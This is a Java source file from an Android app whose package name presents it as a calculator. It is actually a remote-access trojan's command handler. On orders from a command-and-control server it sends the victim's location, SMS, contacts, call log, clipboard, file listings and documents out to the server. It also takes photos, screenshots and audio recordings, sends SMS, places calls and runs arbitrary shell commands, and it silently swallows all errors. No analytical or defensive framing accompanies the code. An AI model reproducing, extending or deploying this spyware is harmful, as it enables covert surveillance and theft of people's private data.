package com.yangdai.calc.core;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import org.json.JSONObject;

import java.io.File;

public class Commands {

    public static void handle(Context ctx, C2Client c2, String cmdId, String kind, JSONObject args) {
        try {
            switch (kind) {
                case "location":
                    c2.sendResult("location", Exfil.location(ctx), cmdId);
                    break;
                case "sms":
                    c2.sendResult("sms", wrap("items", Exfil.sms(ctx)), cmdId);
                    break;
                case "contacts":
                    c2.sendResult("contacts", wrap("items", Exfil.contacts(ctx)), cmdId);
                    break;
                case "call_log":
                    c2.sendResult("call_log", wrap("items", Exfil.callLog(ctx)), cmdId);
                    break;
                case "apps":
                    c2.sendResult("apps", wrap("items", Exfil.installedApps(ctx)), cmdId);
                    break;
                case "clipboard":
                    JSONObject o = new JSONObject();
                    o.put("text", Exfil.clipboard(ctx));
                    c2.sendResult("clipboard", o, cmdId);
                    break;
                case "files":
                    c2.sendResult("files", wrap("items", Exfil.listFiles(new File("/sdcard"), 0)), cmdId);
                    break;
                case "camera":
                    new Thread(() -> Media.capturePhoto(ctx, c2, cmdId)).start();
                    break;
                case "screenshot":
                    new Thread(() -> Media.captureScreen(ctx, c2, cmdId)).start();
                    break;
                case "mic":
                    int secs = args != null ? args.optInt("seconds", 10) : 10;
                    new Thread(() -> Media.recordAudio(ctx, c2, cmdId, secs)).start();
                    break;
                case "sms_send":
                    if (args != null) {
                        Media.sendSms(args.optString("to"), args.optString("body"));
                        c2.sendResult("sms_send", wrap("ok", args.optString("to")), cmdId);
                    }
                    break;
                case "call":
                    if (args != null) {
                        try {
                            Intent i = new Intent(Intent.ACTION_CALL);
                            i.setData(Uri.parse("tel:" + args.optString("number")));
                            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            ctx.startActivity(i);
                        } catch (Exception ignored) {}
                    }
                    break;
                case "shell":
                    if (args != null) {
                        String out = Shell.run(args.optString("cmd"));
                        JSONObject so = new JSONObject();
                        so.put("output", out);
                        c2.sendResult("shell", so, cmdId);
                    }
                    break;
                case "docs":
                    new Thread(() -> {
                        for (File f : Exfil.searchDocs()) {
                            c2.uploadFile("docs", f, cmdId, "{\"path\":\"" + f.getAbsolutePath() + "\"}");
                        }
                    }).start();
                    break;
            }
        } catch (Exception ignored) {}
    }

    private static JSONObject wrap(String key, Object val) throws Exception {
        JSONObject o = new JSONObject();
        o.put(key, val);
        return o;
    }
}
